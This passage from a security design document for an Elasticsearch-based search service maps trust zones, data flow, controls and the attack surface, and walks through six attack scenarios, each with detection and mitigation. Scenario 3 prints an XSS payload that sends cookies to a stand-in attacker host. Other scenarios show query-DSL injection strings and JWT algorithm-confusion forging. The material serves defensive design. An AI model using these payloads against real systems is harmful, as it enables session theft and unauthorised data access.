  → Does NOT re-verify JWT — trusts the gateway's verification

ZONE 4: Search Index (Elasticsearch)
  → Receives queries from Search API only (no direct external access)
  → Enforces index-level ACL via query filters added by Search API
  → Does NOT independently verify user identity
  → If Search API is compromised, the index is fully accessible

ZONE 5: Data Stores (PostgreSQL, Redis)
  → Accessible only from within VPC
  → Auth via service credentials (Secrets Manager)
  → No user-level identity at this layer
```

**Critical trust boundary violation to avoid:** Never let the search index be directly queryable from the internet or from untrusted internal services. If an attacker bypasses the Search API and queries Elasticsearch directly, all ACL controls are bypassed. Elasticsearch should be in a private subnet with security groups that only allow inbound from the Search API's security group.

---

## 6. Data Flow

### Complete Data Movement Map

```
                    RAW USER INPUT
                         │
                         │ "distributed tracing best practices"
                         ▼
              ┌──────────────────────┐
              │  Query Normalizer    │  String → TokenizedQuery struct
              │  (application layer) │
              └──────────┬───────────┘
                         │ { tokens: [...], phrases: [...], boosts: [...] }
                         ▼
              ┌──────────────────────┐
              │  Cache Lookup        │  TokenizedQuery → cache key
              │  (Redis)             │  hash → cache hit (JSON) or miss
              └──────────┬───────────┘
                         │ miss: forward; hit: deserialize + return
                         ▼
              ┌──────────────────────┐
              │  Query Builder       │  TokenizedQuery → Elasticsearch DSL (JSON)
              │                      │  Adds ACL filter, boosting, pagination
              └──────────┬───────────┘
                         │ Elasticsearch Query DSL (JSON, ~1KB)
                         ▼
              ┌──────────────────────┐
              │  Elasticsearch       │  DSL → postings list traversal → BM25 scoring
              │  Coordinator         │  → top-K docs per shard → merge + global rank
              └──────────┬───────────┘
                         │ SearchResponse: [{ id, score, _source, highlights }]
                         ▼
              ┌──────────────────────┐
              │  ACL Post-Filter     │  Remove docs user can't access
              │  + Re-Ranker         │  Adjust scores by personalization features
              └──────────┬───────────┘
                         │ Filtered + re-ranked [{ doc, score, snippet }]
                         ▼
              ┌──────────────────────┐
              │  Snippet Generator   │  Extract highlight spans → HTML snippets
              │                      │  with <em> tags around matched terms
              └──────────┬───────────┘
                         │ Final result set + metadata
                         ▼
              ┌──────────────────────┐
              │  Response Serializer │  Struct → JSON → Brotli compress
              └──────────┬───────────┘
                         │ Compressed JSON (HTTP response body)
                         ▼
                    USER'S BROWSER
```

---

### Serialization Formats and Risks

**Query DSL (JSON to Elasticsearch):**
The Search API constructs a JSON object representing the query. This JSON is sent as the request body to Elasticsearch via the gRPC or HTTP client. The critical point: the user's query terms must be treated as values, never as query structure.

Dangerous pattern (JSON injection):
```python
# WRONG: string concatenation into JSON
query_json = '{"query": {"match": {"content": "' + user_query + '"}}}'
# If user_query = '"}}, "script": {"source": "System.exit(0)"}}'
# The resulting JSON contains an injected script query
```

Correct pattern:
```python
# RIGHT: structured query construction
query = {
    "query": {
        "bool": {
            "must": [
                {"match": {"content": user_query}}  # user_query is a value, not JSON
            ]
        }
    }
}
# JSON serialization handles escaping
json.dumps(query)
```

**Internal service communication (gRPC + Protocol Buffers):**
Between the Search API and Elasticsearch (or internal services), gRPC with Protobuf is preferred over REST+JSON for internal calls. Reasons:
- Binary encoding: Protobuf is 3–10× smaller than JSON for the same data
- Schema enforcement: Protobuf schema defines field types at compile time — type mismatch is a compile error, not a runtime error
- Streaming: gRPC supports server-side streaming — Elasticsearch can stream shard results back as they arrive

**Kafka search events (Avro with Schema Registry):**
```
Kafka event schema (Avro):
{
  "type": "record",
  "name": "SearchEvent",
  "fields": [
    {"name": "eventId",       "type": "string"},
    {"name": "userId",        "type": ["null", "string"]},
    {"name": "tenantId",      "type": "string"},
    {"name": "rawQuery",      "type": "string"},
    {"name": "normalizedQuery","type": "string"},
    {"name": "resultCount",   "type": "int"},
    {"name": "resultIds",     "type": {"type": "array", "items": "string"}},
    {"name": "durationMs",    "type": "long"},
    {"name": "fromCache",     "type": "boolean"},
    {"name": "page",          "type": "int"},
    {"name": "timestampMs",   "type": "long"},
    {"name": "sessionId",     "type": "string"}
  ]
}
```

Schema Registry enforces that producers and consumers agree on the schema. Schema evolution (adding fields with defaults) is supported without breaking existing consumers.

---

## 7. Security Controls

### Encryption In Transit

- All external traffic: TLS 1.3 (TLS 1.2 minimum). Cipher suites restricted to AEAD: `TLS_AES_256_GCM_SHA384`, `TLS_AES_128_GCM_SHA256`, `TLS_CHACHA20_POLY1305_SHA256`.
- Internal gRPC (Search API → Elasticsearch): mTLS. Both client and server present certificates signed by an internal CA. A compromised Search API pod cannot be impersonated — it must hold the signed client cert.
- Kafka: SASL/SCRAM-SHA-512 + TLS. Producers and consumers authenticate with username+password (from Secrets Manager). All Kafka traffic is encrypted in transit.
- Redis: TLS on ElastiCache, auth token required.

### Encryption At Rest

- Elasticsearch data: Volume encryption (AWS EBS encrypted with KMS). Index data, inverted index, stored fields — all encrypted on disk. Elasticsearch-level field-level encryption for sensitive metadata fields (PII in document metadata).
- PostgreSQL (ACL rules, user preferences): AWS RDS with storage encryption (KMS).
- Redis: ElastiCache encryption at rest.
- Kafka: MSK (Managed Kafka) with EBS encryption.
- S3 (document store): SSE-KMS, server-side encryption with customer-managed key.

### Input Validation — Complete Checklist

```
Parameter        Validation
─────────────────────────────────────────────────────────────────────
q (query)        - Type: string
                 - Length: 1–500 chars (400 if > 500)
                 - Encoding: URL-decoded, UTF-8 validated, NFC normalized
                 - Null bytes stripped
                 - HTML special chars escaped on output (XSS prevention)
                 - NOT executed as code — treated as data throughout

page             - Type: integer (strict parse — reject "1abc")
                 - Range: 1–1000 (beyond 1000, suggest cursor-based pagination)
                 - Default: 1

limit            - Type: integer (strict parse)
                 - Range: 1–100
                 - Default: 20

filters          - Field names: validated against allowlist
                   ["type", "author", "date_range", "language", "status"]
                 - Field values: validated by field-specific rules
                   type: must be in ["article", "doc", "api_reference", "blog"]
                   author: alphanumeric + spaces, 1–100 chars
                   date_range: ISO 8601 date format
                 - NEVER pass filter field names directly to Elasticsearch
                   without allowlist check

sort             - Must be in allowlist: ["relevance", "date_asc", "date_desc",
                   "popularity"]
                 - NEVER pass sort field directly to Elasticsearch
                   (prevents sorting on internal fields, metadata exfiltration)
```

### Secrets Handling

- Elasticsearch credentials: AWS Secrets Manager, fetched at pod startup. Auto-rotated every 30 days. Secret ARN in environment variable (not the secret itself).
- JWT public keys: Not secrets — public by design. Fetched from JWKS endpoint. Cached in process memory for 1 hour.
- JWT private key (auth service only): HSM-backed KMS key. Private key bytes never in memory outside HSM. Auth service calls KMS Sign API.
- Redis auth token: AWS Secrets Manager. Rotated via Lambda on a schedule.
- No secrets in: Docker images, Terraform state files committed to repos (use remote state with encryption), application logs, error messages returned to clients.

---

## 8. Attack Surface Mapping

```
╔══════════════════════════════════════════════════════════════════╗
║              EXTERNAL ATTACK SURFACE                             ║
╚══════════════════════════════════════════════════════════════════╝

ENTRY POINT 1: Search API — GET /api/v1/search
  Auth: JWT required (or anonymous with reduced results)
  Inputs: q, page, limit, filters, sort
  Risk: Query injection, deep pagination DoS, ACL bypass

ENTRY POINT 2: Autocomplete — GET /api/v1/suggest
  Auth: Optional (suggestions are public)
  Inputs: prefix (string)
  Risk: Enumeration of indexed terms, information disclosure

ENTRY POINT 3: Auth Endpoints — /auth/login, /auth/refresh
  Auth: None (these ARE the auth endpoints)
  Risk: Brute force, credential stuffing, account enumeration

ENTRY POINT 4: CDN-cached search results
  Auth: None for cached anonymous results
  Risk: Cache poisoning, stale results

ENTRY POINT 5: Search Event Webhooks (if implemented)
  Auth: HMAC signature verification
  Risk: SSRF via webhook URL, replay attacks

╔══════════════════════════════════════════════════════════════════╗
║              INTERNAL ATTACK SURFACE                             ║
╚══════════════════════════════════════════════════════════════════╝

ENTRY POINT 6: Elasticsearch HTTP API (port 9200)
  Should be: VPC-private only, firewall block
  Risk if exposed: Full index read/write without application-layer ACL

ENTRY POINT 7: Kafka (broker ports 9092/9093)
  Should be: VPC-private, SASL auth
  Risk if accessible: Read search event stream (user query PII),
                      inject malformed events

ENTRY POINT 8: Redis (port 6379)
  Should be: VPC-private, auth token
  Risk if accessible: Read/write cache (cache poisoning),
                      read rate limit counters (bypass),
                      KEYS command → enumerate all cached queries

ENTRY POINT 9: PostgreSQL (port 5432)
  Should be: VPC-private, service credentials
  Risk if accessible: Read ACL rules, user preferences, audit logs

ENTRY POINT 10: Index ingestion pipeline
  Path: Document → Preprocessor → Elasticsearch index
  Risk: Document injection — malicious content indexed into search results
        (stored XSS if snippets are rendered unsanitized)

TRUST BOUNDARY MAP:

[Internet]──TLS:443──▶[LB/WAF]──HTTP──▶[Search API]──gRPC/mTLS──▶[Elasticsearch]
                                              │                           │
                                              │ SDK/TLS                   │ VPC-only
                                              ▼                           ▼
                                           [Redis]                  [PostgreSQL]
                                           (VPC)                    (VPC)
                                              │
                                    async     │
                                   ┌──────────▼──────────┐
                                   │  Kafka (VPC-private) │
                                   └──────────────────────┘
```

```
ATTACK SURFACE RISK MATRIX:

Surface              Exposure    Auth Required   Impact if Exploited
────────────────────────────────────────────────────────────────────
Search API           Internet    Yes (JWT)       Data exfiltration, DoS
Autocomplete API     Internet    No              Term enumeration
Elasticsearch        VPC         mTLS cert       Full data breach
Kafka                VPC         SASL            PII exfiltration
Redis                VPC         Auth token      Cache poisoning, bypass
PostgreSQL           VPC         Password        ACL rules, preferences
Index ingestion      Internal    Service token   Stored XSS, false results
```

---

## 9. Attack Scenarios

### Scenario 1: Search Query Injection (Elasticsearch Query DSL Injection)

**Attacker assumptions:**
- Has a valid user account
- Knows (or guesses) the system uses Elasticsearch
- Goal: extract documents they're not authorized to see, or cause server-side errors revealing system information

**Step-by-step execution:**

1. Attacker sends a search query with a crafted payload:
```
GET /api/v1/search?q=*&filters=type:article
```
The `*` wildcard query in Elasticsearch matches all documents. If the system passes this directly as a match query, it returns all documents. Most systems handle this — BUT the attacker can test the system's behavior.

2. More sophisticated — attacker crafts a filter value designed to inject into the query DSL:
```
GET /api/v1/search?q=test&filters=type:article%7D%7D%7D%2C%22size%22%3A10000%7D
```
URL decoded: `filters=type:article}}},  "size":10000}`

3. If the server does naive string concatenation:
```python
# VULNERABLE
query_str = f'{{"query": {{"match": {{"content": "{q}"}}}}, "filter": "{filters}"}}'
# Attacker's input closes the JSON structure and adds size:10000
# Resulting query: {... "filter": "type:article"}}}, "size":10000}
# Elasticsearch interprets the injected "size" and returns 10000 results
```

4. More impactful: inject a `script` query. Elasticsearch script queries run Painless scripts server-side:
```
filters=type:article","script":{"source":"params._source.secretField"}
```
If injected into a script_fields query, this can exfiltrate fields not in the normal response.

5. Most impactful: exploit `_cluster` or `_cat` endpoints if Search API's Elasticsearch client has `DELETE` permissions and the injection reaches the right path.

**Where detection could happen:**
- WAF rule detects URL-encoded JSON braces/brackets in query parameters — flag and block
- Elasticsearch query audit log shows malformed DSL or unusually large size parameters
- Anomalous result count spike (10,000 results returned when typical is 20)
- Error rate spike in Elasticsearch from malformed queries

**Why this works:**
String concatenation to build query structures is the root cause. The fix — always use a query builder library that takes user input as typed values, never as query fragments — is simple but must be enforced by code review.

**Mitigation:**
- Never string-concatenate user input into query DSL
- Use an official Elasticsearch client library's typed query builders
- Validate and allowlist all filter field names before they touch the query builder
- Set Elasticsearch `script.allowed_types: none` in production (disable script execution)
- Use a dedicated Elasticsearch user with read-only permissions for the Search API

---

### Scenario 2: Cache Poisoning to Serve Malicious Results

**Attacker assumptions:**
- Can make authenticated requests to the search API
- The system caches search results keyed by (normalized_query, userId_or_anon)
- For anonymous queries, a shared cache key is used (same result for all anonymous users)
- Goal: poison the cache so other users see attacker-controlled results

**Step-by-step execution:**

1. Attacker identifies that the query `"security vulnerabilities"` is a high-traffic search term (discoverable via autocomplete suggestions showing popular queries).

2. Attacker identifies the cache key construction:
   - Query is normalized: `"secur vulner"`
   - Cache key: `cache:search:SHA256("secur vulner|page=1|limit=20"):anon`

3. Attacker crafts a request that produces malicious results:
   - **Scenario A (if attacker controls indexed content):** Attacker injects a document into the index (via the document ingestion API, if they have write access) with content highly relevant to "security vulnerabilities" but containing malicious snippet text (e.g., phishing links, misleading information). This document now ranks highly for the query.
   - **Scenario B (SSRF-based cache poisoning):** If the search API fetches enrichment data from a URL in the search results (e.g., fetching preview images from document URLs), a crafted document URL could be used to SSRF against internal services.
   - **Scenario C (race condition on shared cache):** Two requests fire simultaneously for the same anonymous query. The attacker times their request to ensure their (possibly manipulated) result set is the one that gets written to cache.

4. For Scenario A: The poisoned document is indexed. The next search for "security vulnerabilities" returns the attacker's document as a top result. The result is cached. All subsequent anonymous searches for this term in the next 5 minutes see the attacker's malicious snippet.

**Where detection could happen:**
- Document indexing audit log — new document from unusual user/source
- Content moderation pipeline on indexed documents — check for URLs, scripts in content
- Anomalous snippet content (URLs in snippets) — flag for review
- User reports — users clicking a "bad result" button

**Why this works:**
A shared anonymous cache key means poisoning the cache once affects all users. The root cause is insufficient content moderation on indexed documents + shared result caching.

**Mitigation:**
- Content moderation pipeline on all indexed content (strip HTML, validate URLs, check against blocklists)
- Snippet output escaping: always HTML-escape snippet text before including in JSON response
- Separate cache namespaces per tenant for multi-tenant systems
- Cache the result only after ACL validation has already been applied — never cache pre-ACL results

---

### Scenario 3: Stored XSS via Malicious Document Title in Search Snippets

**Attacker assumptions:**
- Can submit a document for indexing (e.g., via a document creation API in the same platform)
- The document's title or content is indexed and returned in search snippets
- The front-end renders snippets as HTML (to support `<em>` highlights)
- Goal: execute JavaScript in other users' browsers via a malicious document title

**Step-by-step execution:**

1. Attacker submits a document with the title:
```
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

2. This document is indexed. Its "title" field in Elasticsearch is stored as:
```
"title": "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">"
```

3. A user searches for terms that match this document. The search API returns:
```json
{
  "title": "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">",
  "highlights": { "title": ["<em>...</em>"] }
}
```

4. The frontend JavaScript renders this with:
```javascript
// WRONG: directly setting innerHTML with server-provided content
resultElement.innerHTML = result.title;
```

5. The browser executes the `onerror` handler. Attacker receives the user's cookie.

**Where detection could happen:**
- Content validation at document ingestion: check for HTML/script tags in title fields
- CSP (Content-Security-Policy) header in search results page: `script-src 'self'` blocks inline scripts
- WAF rule on the frontend: blocks `<script>` and `onerror=` in content
- XSS auditor (browser-side — deprecated in Chrome, still present in some browsers)

**Why this works:**
Rendering user-controlled HTML content from API responses directly into the DOM without sanitization. The `highlights` field contains `<em>` tags (intentional HTML) — this can mislead developers into thinking all snippet fields contain intended HTML.

**Mitigation:**
- Content validation at ingestion: strip all HTML tags from title, description, and user-controlled fields. Only the `highlights` field should contain `<em>` tags, and only those tags, nothing else.
- Frontend: never use `innerHTML` for search result titles. Use `textContent` for plain text fields. For highlights (which legitimately contain `<em>`), use `DOMPurify.sanitize(snippet, {ALLOWED_TAGS: ['em']})` before setting innerHTML.
- CSP: `Content-Security-Policy: script-src 'self'; object-src 'none'` — even if XSS is injected, it can't exfiltrate cookies if CSP is strict.
- HttpOnly cookie flag: session cookies with HttpOnly can't be read by JavaScript even if XSS fires.

---

### Scenario 4: Search-Based Data Exfiltration (Timing Side-Channel / Inference Attack)

**Attacker assumptions:**
- Authenticated user (User A) in a multi-tenant system
- Users from different tenants are isolated — User A cannot see Tenant B's documents
- ACL is enforced (attacker can't directly query Tenant B's data)
- Goal: infer whether Tenant B has documents containing specific sensitive terms

**Step-by-step execution:**

1. User A sends queries that reference terms that might be in Tenant B's documents:
```
GET /search?q=project+moonshot&filters=type:all
```

2. **Timing oracle:** The search engine processes the query across all tenant shards (if the system is improperly isolated at the shard level). Even if Tenant B's results are post-filtered (removed before response), the query still runs against Tenant B's data.

3. If Tenant B has many documents matching "project moonshot," the query takes slightly longer (postings lists are longer, BM25 scoring is slower). If Tenant B has zero documents, the query is faster.

4. By timing 1000 queries for different terms, User A can build a vocabulary of what Tenant B has indexed — without ever seeing a single document.

**More direct variant:** If the API returns `meta.total = 847` including results from all tenants before filtering, User A can see Tenant B's document count:
```json
{ "meta": { "total": 847, ... }, "results": [] }  // 0 visible results but 847 total?
```
This directly reveals that 847 documents match the query across all tenants, even if 0 are shown to User A.

**Where detection could happen:**
- Anomalous query volume from User A (1000 queries in short succession) — rate limit + alert
- Consistent queries with zero results but non-zero total counts — anomaly detection
- Queries that look like data reconnaissance (short, specific noun phrases, systematic variation)

**Why this works:**
Cross-tenant data leakage via timing or metadata. The root cause is insufficient tenant isolation at the query execution layer.

**Mitigation:**
- Hard shard/index isolation per tenant: each tenant's data lives in a separate Elasticsearch index. A query for Tenant A never touches Tenant B's index, eliminating timing oracles.
- Never return `meta.total` counts that include inaccessible documents. Compute total AFTER applying ACL filters.
- Normalize response timing: introduce artificial jitter for fast queries (make all responses ≥ 50ms minimum) to reduce timing oracle accuracy.
- Strict rate limiting: 100 requests/minute per user. Timing attacks requiring 1000 queries take ≥ 10 minutes.

---

### Scenario 5: Autocomplete Oracle for Data Discovery

**Attacker assumptions:**
- Anonymous or authenticated user
- Autocomplete endpoint is publicly accessible (no auth required for common deployments)
- Autocomplete suggestions are derived from indexed content (document titles, field values)
- Goal: enumerate sensitive information indexed in the system

**Step-by-step execution:**

1. Attacker sends autocomplete requests with systematic prefixes:
```
GET /api/v1/suggest?prefix=employee+salary+
GET /api/v1/suggest?prefix=employee+salary+2
GET /api/v1/suggest?prefix=employee+salary+20
GET /api/v1/suggest?prefix=employee+salary+202
```

2. If the suggestion index contains a document titled "Employee Salary 2024 Confidential", the autocomplete returns this suggestion to anyone who types the prefix.

3. Attacker systematically traverses the prefix tree:
```python
for char in 'abcdefghijklmnopqrstuvwxyz0123456789 ':
    suggestions = get_suggestions(current_prefix + char)
    for s in suggestions:
        if s is interesting: explore(s)
```

This is a deterministic traversal of the suggestion trie — it reveals all indexed document titles.

**Where detection could happen:**
- Extremely high autocomplete request rate from single IP/user — rate limit
- Systematic single-character increment pattern — behavioral anomaly detection
- Autocomplete requests with very specific prefixes (not typical user behavior)

**Why this works:**
The suggestion index contains verbatim document titles/fields without ACL filtering. A document that requires auth to read can still appear in public autocomplete suggestions, leaking its title to unauthenticated users.

**Mitigation:**
- Apply the same ACL to autocomplete suggestions as to full search results. A document's title should only appear in suggestions for users who have at least read access to that document.
- For public autocomplete: only surface suggestions from public-flagged documents.
- Rate limit autocomplete endpoint aggressively: 30 requests/minute per IP.
- Add noise: if the prefix matches fewer than 3 documents, return no suggestions (k-anonymity for autocomplete).

---

### Scenario 6: JWT Algorithm Confusion + Search Scope Escalation

**Attacker assumptions:**
- Can obtain the public key from the JWKS endpoint (by design — it's public)
- The Search API incorrectly accepts multiple JWT signing algorithms
- Goal: forge a JWT with elevated scopes (e.g., `search:admin` instead of `search:read`)

**Step-by-step execution:**

1. Attacker fetches: `GET https://auth.example.com/.well-known/jwks.json`
   Returns the RSA public key for key ID `key-2024-05`.

2. Attacker crafts a forged JWT:
   - Header: `{"alg": "HS256", "kid": "key-2024-05"}`  (changed from RS256 to HS256)
   - Payload: `{"sub": "usr_attacker", "scope": ["search:admin", "search:read"], "exp": [future], "iss": "https://auth.example.com", "aud": "https://api.example.com"}`
   - Signature: `HMAC-SHA256(header + "." + payload, rsa_public_key_bytes)`

3. The RSA public key is public. The attacker uses its bytes as the HMAC secret.

4. Vulnerable Search API receives the token:
   - Reads `alg` from header → "HS256"
   - Reads `kid` from header → "key-2024-05"
   - Fetches RSA public key for kid → gets the key bytes
   - Because alg is HS256, verifies with HMAC using those same key bytes
   - HMAC verification passes (attacker computed it with the same public key bytes)
   - Token accepted. Attacker has `search:admin` scope.

5. With `search:admin`, attacker can: search across all tenants, see all documents regardless of ACL, access admin-only search management endpoints.

**Where detection could happen:**
- Log the `alg` field from every JWT. Alert on any non-RS256 algorithm in logs.
- Monitor for `search:admin` scope usage from non-admin user IDs.

**Mitigation:**
- Hardcode `alg = "RS256"` in the JWT validator. Never read the algorithm from the token.
- One line of code: `if header.alg != "RS256": return 401`
- Use a well-reviewed JWT library that requires explicit algorithm specification at validation time.

---

## 10. Failure Points

### What Fails Under Load

**Elasticsearch GC pressure (the most common production incident):**

Elasticsearch runs on JVM. The heap stores: inverted index segments (partially), field data caches, query caches, bulk operation buffers. At high query rates, field data caches (used for sorting and facet computation) grow. When heap fills, the JVM triggers stop-the-world garbage collection. During GC, Elasticsearch cannot respond to queries. The cluster appears to hang for 5–30 seconds. Circuit breakers trip. The Search API gets connection timeouts from Elasticsearch. Search results queue up. Pod memory grows. Eventually, OOM kills the pod.

Root cause: Unbounded field data cache. Fix: set `indices.fielddata.cache.size: 20%` in elasticsearch.yml. Disable field data on high-cardinality fields (user IDs, full text content) — use doc_values instead for sorting.

**Search API connection pool exhaustion:**

The Search API maintains a gRPC connection pool to Elasticsearch. Each concurrent search request consumes one connection. At 500 concurrent requests and a pool of 100 connections, 400 requests queue waiting for a connection. Queue fills. New requests get `connection pool exhausted` errors. The API returns 503.

Fix: size the connection pool to match expected concurrency. Add a queue with a max depth. Return 503 with `Retry-After` when the queue is full — don't let requests hang indefinitely.

**Redis connection storm on startup:**

When the Search API deploys (rolling deploy: 10 new pods come up simultaneously), each pod starts up and immediately tries to establish a Redis connection pool (50 connections per pod × 10 pods = 500 new connections in 5 seconds). Redis has a `maxclients` limit (default 10,000, but Elasticache limits vary). A sudden 500-connection spike can overwhelm smaller Redis instances.

Fix: stagger pod startup (k8s `startupProbe` with delay), limit initial connection pool size, use exponential backoff on Redis connection establishment.

**Query fanout amplification:**

A single search request fans out to N shards. At 5 shards, each search is 5 internal requests. At 100 requests/second to the Search API, Elasticsearch receives 500 requests/second. At 1000 requests/second, Elasticsearch receives 5000 requests/second. The Search API is an amplifier. This is inherent to sharded search — but it means Elasticsearch must be sized for N × (API request rate).

---

### What Fails Under Attack

**Query complexity explosion (ReDoS / expensive query):**

A wildcard query `q=a*b*c*d*e*f*g*h*i*j*` creates an exponential number of automaton states in the Elasticsearch regex engine. CPU spikes to 100% on the shard processing this query. Other queries queue behind it. A handful of these queries can bring down a shard.

Fix: Disable wildcard queries (`indices.query.bool.max_clause_count` and wildcard query restrictions). Enforce that the `q` parameter is treated as a standard query string, not a regex or wildcard expression.

**The N+1 personalization problem under DoS:**

If personalization requires a DB lookup per result (get user's click history for each of 20 results), a search request triggers 20 PostgreSQL queries. At 1000 searches/second, that's 20,000 DB queries/second. The DB falls over. Personalization must be a single lookup (fetch the user's feature vector once), not a per-result lookup.

**Elasticsearch shard unavailability:**

If one Elasticsearch primary shard becomes unavailable (the node crashes), Elasticsearch promotes the replica. During promotion, queries to that shard fail or return partial results. The Search API should handle partial shard failures gracefully: return the best results from available shards with a degraded-mode flag, rather than returning a hard error.

---

### Common Misconfigurations

| Misconfiguration | Impact |
|---|---|
| Elasticsearch port 9200 exposed to internet | Full unauthenticated access to all indexed data |
| `_all` field enabled in Elasticsearch | Queries search all fields including internal ones — ACL bypass risk |
| Autocomplete without ACL | Reveals document titles to unauthorized users |
| `meta.total` includes post-ACL-filtered count | Cross-tenant data leakage |
| Field data cache unbounded | JVM GC pause → cluster unavailability |
| Wildcard query not rate-limited or disabled | CPU exhaustion via crafted regex |
| Session cookie without HttpOnly | XSS can steal session cookie |
| Search event Kafka topic readable by all internal services | PII (raw user queries) exposed broadly |
| Synonym dictionary loaded from user-editable source | Attacker expands "login" → "password reset" in synonyms, manipulating search results |
| Index name leaked in error responses | Reveals internal naming convention, aids enumeration |

---

## 11. Mitigations

### Defense-in-Depth Strategy

**Layer 1: Prevent**

Query safety:
```
1. Allowlist all filter field names — never pass raw user input as a field name
2. Use typed query builder — never string-concatenate user input into DSL
3. Set Elasticsearch query timeouts (search.timeout: 3s) — kill slow queries
4. Disable dangerous query types:
   - PUT /_cluster/settings -d '{"transient": {"search.allow_expensive_queries": false}}'
   - This disables: fuzzy queries on text fields, regex queries, wildcard queries,
     join queries, large range queries on analyzed fields
5. Validate and bound all pagination parameters server-side
```

Content safety:
```
1. HTML strip all user-submitted content at ingestion time
   (strip all HTML, not just escape — reconstruction attacks exist for escaping)
2. DOMPurify on the frontend for snippet rendering
3. CSP: script-src 'self'; object-src 'none'; base-uri 'none'
4. HttpOnly + Secure + SameSite=Strict on session cookies
```

Infrastructure isolation:
```
1. Elasticsearch in private subnet, security group allows only Search API SG
2. Separate Elasticsearch clusters (or at minimum, separate indices) per tenant
3. Redis in private subnet, auth token required
4. No direct internet access from Search API or Elasticsearch nodes
```

**Layer 2: Detect**

```
Anomaly detection rules:
- Alert: query with > 10 wildcard characters
- Alert: same user > 1000 queries in 10 minutes
- Alert: JWT with non-RS256 algorithm in logs
- Alert: filter field name not in allowlist (this is a hard block but also log + alert)
- Alert: Elasticsearch errors spike > 1% of queries
- Alert: p99 query latency > 500ms (index health degradation)
- Alert: Redis cache hit rate drops below 30% (cache invalidation storm or new query patterns)
- Alert: Zero-result rate > 20% (query normalization regression or index corruption)
```

**Layer 3: Contain**

```
Blast radius reduction:
- Search API Elasticsearch user: read-only, restricted to specific indices
  (cannot: create/delete indices, modify mappings, run scripts, access _cluster APIs)
- Worker IAM role: can only publish to search-events Kafka topic, cannot consume
- Separate KMS keys per data store
- Elasticsearch node isolation: if one node is compromised, mTLS prevents lateral movement
```

---

### Engineering Tradeoffs

**Real-time ACL vs. Cached ACL:**
Checking ACL in real-time (per-query DB lookup) is always accurate but adds latency (5–15ms DB lookup). Cached ACL (user's group memberships cached in JWT claims or Redis) is faster but may be stale: if a user is removed from a group, they retain access until their JWT expires (up to 15 minutes) or the cache expires (up to 5 minutes).

Tradeoff decision: For most SaaS applications, 5–15 minute ACL staleness is acceptable and the performance gain is worth it. For high-security environments (financial data, healthcare), real-time ACL check is required — absorb the latency or use a very fast ACL service (sub-1ms lookups via Redis).

**Relevance vs. Privacy:**
Personalization improves relevance (better results for the user) but requires storing and using behavioral data (click history, query history). Each piece of behavioral data is a privacy liability. Tradeoff: implement personalization with explicit user consent, store minimal data (click events, not raw queries), apply retention policies (delete data after 90 days), and allow users to clear their history.

---

## 12. Observability

### Logs

**Search API — request log:**
```json
{
  "timestamp": "2024-05-15T12:00:00.087Z",
  "level": "INFO",
  "event": "search_request",
  "requestId": "550e8400-e29b-41d4-a716-446655440000",
  "userId": "usr_4a2b1c",
  "tenantId": "tenant_99",
  "rawQuery": "distributed tracing best practices",
  "normalizedQuery": "distribut trace practic",
  "page": 1,
  "limit": 20,
  "filters": {"type": "article"},
  "resultCount": 20,
  "totalHits": 847,
  "fromCache": false,
  "durationMs": 87,
  "shards": {"total": 5, "successful": 5, "failed": 0},
  "clientIp": "203.0.113.42",
  "clientVersion": "web-2.4.1"
}
```

**DO NOT log:**
- Full JWT tokens (log only the decoded `sub` claim after verification)
- Raw password attempts (from auth endpoints)
- Any query result content (search results may contain confidential document titles — log result IDs only)
- User query if it contains PII (heuristic: if query matches email, SSN, credit card pattern → hash before logging)

**Query PII detection before logging:**
```python
PII_PATTERNS = [
    r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # email
    r'\b\d{3}-\d{2}-\d{4}\b',                                   # SSN
    r'\b(?:\d[ -]*?){13,16}\b'                                   # credit card
]
def safe_log_query(query):
    for pattern in PII_PATTERNS:
        if re.search(pattern, query):
            return "[REDACTED:PII]"
    return query
```

---

### Metrics

```
# Search quality
search_zero_result_rate           # % of queries with 0 results — index quality signal
search_result_count_histogram     # distribution of result counts
search_click_through_rate         # % of result displays followed by a click (engagement)

# Search performance
search_duration_ms{quantile="0.5,0.95,0.99"}  # latency percentiles
elasticsearch_query_duration_ms                # index-level latency
search_cache_hit_rate                          # Redis cache effectiveness
search_cache_eviction_rate                     # cache churn

# System health
elasticsearch_shard_failures_total             # degraded mode indicator
elasticsearch_jvm_heap_used_percent            # GC pressure warning
elasticsearch_indexing_rate                    # write throughput to index
redis_memory_used_bytes                        # Redis capacity

# Security
search_rate_limit_triggered_total{reason="user|ip|tenant"}
search_auth_failure_total{reason="expired|invalid_sig|missing|wrong_scope"}
search_filter_rejection_total{field="..."}     # unknown filter field names (injection attempts)
elasticsearch_rejected_queries_total           # expensive queries blocked

# Business
search_requests_total{tenant, client_version}
search_by_query_type{type="keyword|phrase|filter_only|empty"}
```

---

### Distributed Traces

```
Trace: search_request (traceId: abc123)
├── Span: http_handler (87ms total)
│   ├── Span: jwt_validate (2ms)
│   │   └── Span: jwks_cache_lookup (0.1ms) — cache hit
│   ├── Span: rate_limit_check_redis (1ms)
│   ├── Span: query_normalize (3ms)
│   │   └── Span: synonym_lookup (0.5ms)
│   ├── Span: cache_lookup_redis (1ms) — miss
│   ├── Span: elasticsearch_query (60ms)
│   │   ├── Span: shard_query_0 (55ms)
│   │   ├── Span: shard_query_1 (58ms)
│   │   ├── Span: shard_query_2 (52ms)
│   │   ├── Span: shard_query_3 (60ms)  ← slowest shard
│   │   ├── Span: shard_query_4 (54ms)
│   │   └── Span: merge_results (2ms)
│   ├── Span: acl_post_filter (8ms)
│   │   └── Span: acl_db_lookup (6ms)
│   ├── Span: rerank_personalization (4ms)
│   ├── Span: snippet_generation (5ms)
│   └── Span: json_serialize (2ms)
└── [async] Span: cache_write_redis (fire-and-forget)
└── [async] Span: kafka_publish_event (fire-and-forget)

Key trace annotations to include:
  - Whether result came from cache (cache_hit=true)
  - Number of results before and after ACL filtering
    (before_acl=25, after_acl=20 — 5 filtered)
  - Personalization model version used
  - Elasticsearch node that was the slowest shard
```

**Trace propagation across async boundary (Kafka):**
The search event published to Kafka includes the trace context:
```json
{
  "traceId": "abc123",
  "spanId": "def456",
  "userId": "usr_4a2b1c",
  ...
}
```
Downstream consumers continue the trace by creating child spans with the parent `spanId`. This allows correlating a user's click event (from analytics consumer) with the original search that produced the result they clicked — across service and async boundaries.

---

### What Should Alert vs. What Should Not

